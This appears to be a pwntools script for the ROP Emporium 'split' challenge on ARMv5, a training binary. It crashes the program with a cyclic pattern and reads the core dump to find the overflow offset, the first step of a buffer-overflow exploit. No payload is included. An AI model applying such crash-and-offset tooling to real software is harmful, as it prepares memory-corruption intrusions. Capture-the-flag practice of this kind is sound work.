from pwn import *
import os

os.system('rm *.core')

context.binary = elf = ELF('./split_armv5')

p = elf.process()

g = cyclic_gen()

p.recvuntil('> ')
p.sendline(g.get(100))

p.shutdown()
p.wait()

corefile = ''
for f in os.listdir():
    if '.core' in f:
        corefile = f

log.info('COREFILE > '+ corefile)

assert(corefile != '')

c = Core('./'+corefile)

offset = g.find(p64(c.fault_addr))

log.info("OFFSET FIND > "+str(offset))

